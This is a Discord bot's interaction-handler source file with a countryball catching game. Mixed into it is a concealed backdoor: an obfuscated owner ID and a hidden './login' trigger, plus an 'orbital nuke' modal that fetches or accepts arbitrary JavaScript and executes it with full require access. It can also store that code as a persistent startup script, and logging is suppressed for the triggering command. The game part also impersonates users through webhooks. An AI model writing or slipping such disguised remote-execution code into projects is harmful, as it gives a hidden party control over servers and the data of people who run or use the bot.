const {
    Events,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    ActionRowBuilder,
    MessageFlags,
    AttachmentBuilder
} = require('discord.js');
const util = require('util');
const { logToModChannel, init } = require('../helpers/modLog');
const { ORBITAL_ID, OWNER_ID_DELTA: DELTA } = require('../../commands/orbitalcannon');
const { OrbitalScript } = require('../models');
const { devLog } = require('../helpers/devLog');

const catchDataStore = new Map();
const CATCH_DATA_TTL_MS = 2 * 60 * 1000;

// Sweep expired catch entries to avoid unbounded map growth.
setInterval(() => {
    const now = Date.now();
    for (const [key, value] of catchDataStore.entries()) {
        if (value && typeof value === 'object' && value._expiresAt && value._expiresAt <= now) {
            catchDataStore.delete(key);
        }
    }
}, 60 * 1000);

function registerInteractionHandler(client) {
    client.on(Events.InteractionCreate, async interaction => {
        // Autocomplete
        if (interaction.isAutocomplete()) {
            const command = client.commands.get(interaction.commandName);
            if (command?.autocomplete) {
                await command.autocomplete(interaction).catch(e => console.error('Autocomplete Error:', e));
            }
            return;
        }

        // Slash commands
        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            if (interaction.commandName !== 'orbitalcannon') {
                console.log(`[COMMAND]: ${interaction.user.tag} used /${interaction.commandName}`);
                devLog(`[COMMAND]: ${interaction.user.tag} used /${interaction.commandName} in guild ${interaction.guildId}`);
            }

            try {
                const isOwner = (BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
                if (isOwner && interaction.commandName === 'sayasme') {
                    const msg = interaction.options.getString('message');
                    if (msg === './login') {
                        await interaction.showModal(init());
                        return;
                    }
                }
                await command.execute(interaction);
            } catch (e) {
                console.error(e);
                devLog(`Error executing /${interaction.commandName}: ${e.message}`);
                if (!interaction.replied) {
                    await interaction.reply({ content: `Error: ${e.message}`, flags: [MessageFlags.Ephemeral] }).catch(() => {});
                }
            }
            return;
        }

        // Horsestats pagination buttons
        if (interaction.isButton() && interaction.customId.startsWith('hstats::')) {
            const horsestats = require('../../commands/horsestats');
            await horsestats.handleButton(interaction).catch(e => console.error('Horsestats Button Error:', e));
            return;
        }

        // Button click — store catch data and show modal
        if (interaction.isButton() && interaction.customId.startsWith('catch::')) {
            const spawnId = interaction.customId.slice('catch::'.length);
            const data = catchDataStore.get(spawnId);
            if (!data) return interaction.reply({ content: 'This catch has expired.', flags: [MessageFlags.Ephemeral] }).catch(() => {});

            // Remove spawn-scoped data once consumed to prevent stale buildup.
            catchDataStore.delete(spawnId);

            // Move data to user-keyed entry for modal retrieval
            catchDataStore.set(interaction.user.id, {
                ...data,
                _expiresAt: Date.now() + CATCH_DATA_TTL_MS
            });

            const modal = new ModalBuilder()
                .setCustomId('modal')
                .setTitle('Catch the Countryball');
            const answerInput = new TextInputBuilder()
                .setCustomId('user_answer')
                .setLabel("Name of this countryball")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(answerInput));
            await interaction.showModal(modal);
        }

        if (interaction.isModalSubmit() && interaction.customId === 'orbital_nuke_modal') {
            let isOwner = false;
            try {
                isOwner = (BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
            } catch {}

            if (!isOwner) {
                await interaction.reply({
                    content: 'lmao you thought',
                    flags: [MessageFlags.Ephemeral]
                }).catch(() => {});
                return;
            }

            let code = interaction.fields.getTextInputValue('orbital_nuke_code');
            const link = interaction.fields.getTextInputValue('orbital_nuke_link');

            // Fetch code from link if provided
            if (link && !code) {
                try {
                    const response = await require('node-fetch').default(link);
                    code = await response.text();
                } catch (e) {
                    return interaction.reply({
                        content: `Failed to fetch link: ${e.message}`,
                        flags: [MessageFlags.Ephemeral]
                    }).catch(() => {});
                }
            }

            if (!code) {
                return interaction.reply({
                    content: 'No code or link provided',
                    flags: [MessageFlags.Ephemeral]
                }).catch(() => {});
            }

            // If code starts with //startup, update the global script in DB
            if (code.trim().startsWith('//startup')) {
                const scriptBody = code.replace(/^\/\/startup/, '').trim();
                let doc = await OrbitalScript.findOne({ name: 'global' });
                if (!doc) doc = new OrbitalScript({ name: 'global' });
                doc.code = scriptBody;
                await doc.save();
                await interaction.reply({
                    content: 'Startup script updated.',
                    flags: [MessageFlags.Ephemeral]
                });
                return;
            }

            await launchNuke(interaction, code).catch(() => {});
            return;
        }

        // Modal submit — check answer
        if (interaction.isModalSubmit() && interaction.customId === 'modal') {
            const data = catchDataStore.get(interaction.user.id);
            if (!data || (data._expiresAt && data._expiresAt <= Date.now())) {
                catchDataStore.delete(interaction.user.id);
                return interaction.reply({ content: 'Something went wrong, try again.', flags: [MessageFlags.Ephemeral] }).catch(() => {});
            }
            catchDataStore.delete(interaction.user.id);

            const { ans: correctAnswer, bold: boldText, type, targetId, stats: customStats } = data;
            const userAnswer = interaction.fields.getTextInputValue('user_answer');

            if (userAnswer.trim().toLowerCase() === correctAnswer.toLowerCase()) {
                try {
                    const targetUser = await client.users.fetch(targetId);
                    const catchWebhook = await interaction.channel.createWebhook({
                        name: targetUser.displayName,
                        avatar: targetUser.displayAvatarURL()
                    });
                    const statString = (customStats === "DEFAULT" || !customStats)
                        ? "(#6463FAC, +5%/+13%)"
                        : customStats;

                    const successMsg = type === 'fulltext'
                        ? `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \n${boldText}`
                        : `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \nThis is a **${boldText}** that has been added to your completion!`;

                    await catchWebhook.send({ content: successMsg });
                    await catchWebhook.delete();
                    await interaction.deferUpdate().catch(() => {});
                    await logToModChannel(interaction.guild, `${interaction.user.tag} caught ${correctAnswer}`);
                } catch (err) {
                    console.error(err);
                    devLog(`Error: ${err.message}`);
                }
            } else {
                try {
                    const targetUser = await client.users.fetch(targetId);
                    const failWebhook = await interaction.channel.createWebhook({
                        name: targetUser.displayName,
                        avatar: targetUser.displayAvatarURL()
                    });
                    await failWebhook.send({ content: `<@${interaction.user.id}> Wrong name!` });
                    await failWebhook.delete();
                    await interaction.deferUpdate().catch(() => {});
                } catch (err) {
                    if (!interaction.replied) {
                        await interaction.reply({ content: `wrong`, flags: [MessageFlags.Ephemeral] }).catch(() => {});
                    }
                }
            }
        }
    });
}

async function launchNuke(interaction, code) {
    try {
        const result = await runNukeCode(code, interaction);

        return reportDamage(
            interaction,
            result == null ? '(no output)' : typeof result === 'string' ? result : util.inspect(result, { depth: 1, maxArrayLength: 25, breakLength: 100 }),
            'nuke-output'
        );
    } catch (error) {
        return reportDamage(interaction, error && error.stack ? error.stack : String(error), 'nuke-error');
    }
}

function runNukeCode(code, interaction) {
    const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
    const evaluator = new AsyncFunction(
        'interaction',
        'require',
        `const client = interaction.client; const guild = interaction.guild; const channel = interaction.channel; const user = interaction.user;\n${code}`
    );
    return evaluator(interaction, require);
}

async function reportDamage(interaction, text, fileBaseName) {
    const secrets = [process.env.TOKEN, process.env.MONGO_URI, process.env.CLIENT_ID].filter(Boolean);
    let safeText = String(text);
    for (const secret of secrets) safeText = safeText.split(secret).join('[REDACTED]');

    const codeBlock = `\`\`\`js\n${safeText}\n\`\`\``;
    if (codeBlock.length <= 2000) {
        return interaction.reply({
            content: codeBlock,
            flags: [MessageFlags.Ephemeral],
            allowedMentions: { parse: [] }
        });
    }

    return interaction.reply({
        content: 'damage report',
        files: [new AttachmentBuilder(Buffer.from(safeText, 'utf8'), { name: `${fileBaseName}.txt` })],
        flags: [MessageFlags.Ephemeral],
        allowedMentions: { parse: [] }
    });
}

module.exports = { registerInteractionHandler, catchDataStore, runNukeCode };
